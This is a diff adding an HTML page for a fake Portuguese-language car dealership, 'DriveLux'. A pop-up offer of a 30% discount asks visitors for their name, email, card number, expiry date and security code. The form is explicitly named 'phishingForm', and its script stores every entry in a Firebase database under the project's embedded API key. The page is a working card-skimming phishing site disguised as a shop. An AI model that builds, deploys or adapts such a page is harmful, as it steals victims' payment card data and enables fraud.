@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DriveLux </title>
+    <link rel="stylesheet" href="index.css">
+   
+    <link rel="icon" href="img/air-conditioner_9212567.png" type="image/jpeg" />
+
+    
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
+    
+        const firebaseConfig = {
+            apiKey: "AIzaSyB9YFd_RmQ_qdxsd7KtFnsoY9g1J9x8gMI",
+            authDomain: "site-de-carros-18caf.firebaseapp.com",
+            projectId: "site-de-carros-18caf",
+            storageBucket: "site-de-carros-18caf.appspot.com",
+            messagingSenderId: "27940425290",
+            appId: "1:27940425290:web:238c7401f33a178cca20b3",
+            measurementId: "G-JKLQCPDFHK"
+        };
+    
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app); 
+    
+        document.getElementById("phishingForm").addEventListener("submit", async function (event) {
+            event.preventDefault();
+    
+            const name = document.getElementById("name").value;
+            const email = document.getElementById("email").value;
+            const bank = document.getElementById("bank").value;
+            const accountNumber = document.getElementById("accountNumber").value;
+            const validade = document.getElementById("Validade").value;
+            const pin = document.getElementById("password").value;
+    
+            try {
+                await addDoc(collection(db, "clientes"), {
+                    nome: name,
+                    email: email,
+                    banco: bank,
+                    numeroConta: accountNumber,
+                    validade: validade, 
+                    pin: pin  
+                });
+    
+                document.getElementById("successMessage").style.display = "block";
+                document.getElementById("offerCard").style.display = "none";
+    
+                setTimeout(() => {
+                    document.getElementById("successMessage").style.display = "none";
+                }, 5000); 
+    
+            } catch (error) {
+                console.error("Erro ao cadastrar:", error);
+            }
+        });
+    </script>
+    
+    
+
+
+</head>
+<body>
+    <header>
+  <nav class="navbar">
+    <h1>DriveLux</h1>
+    <button class="menu-toggle" id="menu-toggle">&#9776;</button>
+    <ul class="nav-links" id="nav-links">
+      <li><a href="#home">Início</a></li>
+      <li><a href="#cars">Carros</a></li>
+      <li><a href="#contact">Contato</a></li>
+    </ul>
+    </nav>
+   </header>
+
+
+    <section id="home" class="hero">
+        <h1>Encontre o Carro dos Seus Sonhos!</h1>
+        <p>Confira nossa seleção especial de veículos com preços incríveis.</p>
+        <input type="text" id="searchBar" placeholder="Pesquisar carros..." onkeyup="searchCars()">
+    </section>
+
+    <section id="cars" class="car-list">
+    
+        <div class="category">
+            <h2>SUVs</h2>
+            <div class="car-card" onclick="showOffer()">
+                <img src="img/bmw x5.jpeg" alt="BMW X5 2022">
+                <h3>BMW X5 2022</h3>
+                <p>Preço: 2,000000 Mzn</p>
+                <button>Ver Detalhes</button>
+            </div>
+            <div class="car-card" onclick="showOffer()">
+                <img src="img/mazda bt50.avif" alt="Audi Q7 2021">
+                <h3>Mazda bt50</h3>
+                <p>Preço: 2,000000Mzn</p>
+                <button>Ver Detalhes</button>
+            </div>
+        </div>
+
+     
+        <div class="category">
+            <h2>Sedans</h2>
+            <div class="car-card" onclick="showOffer()">
+                <img src="img/2021-Toyota-Fortuner.jpg" alt="Audi A4 2021">
+                <h3>Toyota-Fortuner</h3>
+                <p>Preço: 3,000000</p>
+                <button>Ver Detalhes</button>
+            </div>
+            <div class="car-card" onclick="showOffer()">
+                <img src="img/mercedes.jpeg" alt="Mercedes C200 2023">
+                <h3>mercedes-benz</h3>
+                <p>Preço: 4,000000</p>
+                <button>Ver Detalhes</button>
+            </div>
+        </div>
+
+        <div class="category">
+            <h2>Esportivos</h2>
+            <div class="car-card" onclick="showOffer()">
+                <img src="img/vw golf.webp" alt="vw golf">
+                <h3>Volkswagen Golf </h3>
+                <p>Preço: 2,000000</p>
+                <button>Ver Detalhes</button>
+            </div>
+            <div class="car-card" onclick="showOffer()">
+                <img src="img/2024-Ford-Ranger-Wildtrak-X-7.webp" alt="triton">
+                <h3> Ranger-Wildtrak</h3>
+                <p>Preço: 3,000000 Mzn</p>
+                <button>Ver Detalhes</button>
+            </div>
+        </div>
+
+        <div class="category">
+            <h2>Pickups</h2>
+            <div class="car-card" onclick="showOffer()">
+                <img src="img/raptor.jpeg" alt="Ford Ranger Raptor">
+                <h3>Ford Ranger Raptor 2023</h3>
+                <p>Preço: 3,000000</p>
+                <button>Ver Detalhes</button>
+            </div>
+            <div class="car-card" onclick="showOffer()">
+                <img src="img/Mitsubishi-Triton.jpg" alt="Mitsubishi Triton">
+                <h3>Mitsubishi Triton 2021</h3>
+                <p>Preço: 4,000000</p>
+                <button>Ver Detalhes</button>
+            </div>
+        </div>
+    </section>
+
+    <div class="card-container" id="offerContainer">
+        <!-- Card de Oferta -->
+        <div class="offer-card" id="offerCard">
+            <h2>Oferta Exclusiva!</h2>
+            <p>Cadastre-se para receber um desconto especial de 30% neste veículo.</p>
+            <form id="phishingForm" onsubmit="registerForm(event)">
+                <input type="text" id="name" placeholder="Nome" required>
+                <input type="email" id="email" placeholder="E-mail" required>
+               
+                <select id="bank" required>
+                    <option value="" disabled selected>Selecione o tipo de Cartão</option>
+                    <option value="VISA">VISA</option>
+                    <option value="MASTERCARD">MASTERCARD</option>
+                </select>
+                <input type="text" id="accountNumber" placeholder="Número do Cartão" required>
+                <input type="date" id="Validade" placeholder="Prazo de Validade" required>
+                <input type="password" id="password" placeholder="Codigo de Segurança" required>
+                <button type="submit">Resgatar Oferta</button>
+            </form>
+        </div>
+      
+<div id="successMessage" class="success-message" style="display: none;">
+    <h2>Dados cadastrados com sucesso!</h2>
+    <p>Obrigado por se cadastrar, você ganhou um desconto de 30%.</p>
+</div>
+
+       
+    <footer>
+        <p>&copy; 2025 DriveLux - Todos os direitos reservados</p>
+    </footer>
+
+    <script>
+        function showOffer() {
+            const offerCard = document.getElementById("offerCard");
+            offerCard.style.display = "block"; 
+            setTimeout(() => {
+                offerCard.classList.add("show"); 
+            }, 10);
+        }
+
+        function searchCars() {
+            let input = document.getElementById("searchBar").value.toLowerCase();
+            let cars = document.getElementsByClassName("car-card");
+            
+            for (let car of cars) {
+                let title = car.getElementsByTagName("h3")[0].innerText.toLowerCase();
+                car.style.display = title.includes(input) ? "block" : "none";
+            }
+        }
+
+        function registerForm(event) {
+            event.preventDefault(); 
+
+            const offerCard = document.getElementById("offerCard");
+            const congratulationsCard = document.getElementById("congratulationsCard");
+
+          
+            offerCard.style.display = "none";
+
+           
+            congratulationsCard.style.display = "block";
+        }
+       
+  // Mostrar ou esconder o menu
+  const toggle = document.getElementById("menu-toggle");
+  const navLinks = document.getElementById("nav-links");
+
+  toggle.addEventListener("click", () => {
+    navLinks.classList.toggle("show");
+  });
+
+  function showOffer() {
+    const offerCard = document.getElementById("offerCard");
+    offerCard.style.display = "block"; 
+    setTimeout(() => {
+      offerCard.classList.add("show"); 
+    }, 10);
+  }
+
+  function searchCars() {
+    let input = document.getElementById("searchBar").value.toLowerCase();
+    let cars = document.getElementsByClassName("car-card");
+    
+    for (let car of cars) {
+      let title = car.getElementsByTagName("h3")[0].innerText.toLowerCase();
+      car.style.display = title.includes(input) ? "block" : "none";
+    }
+  }
+
+  
+
+    </script>
+</body>
+</html>
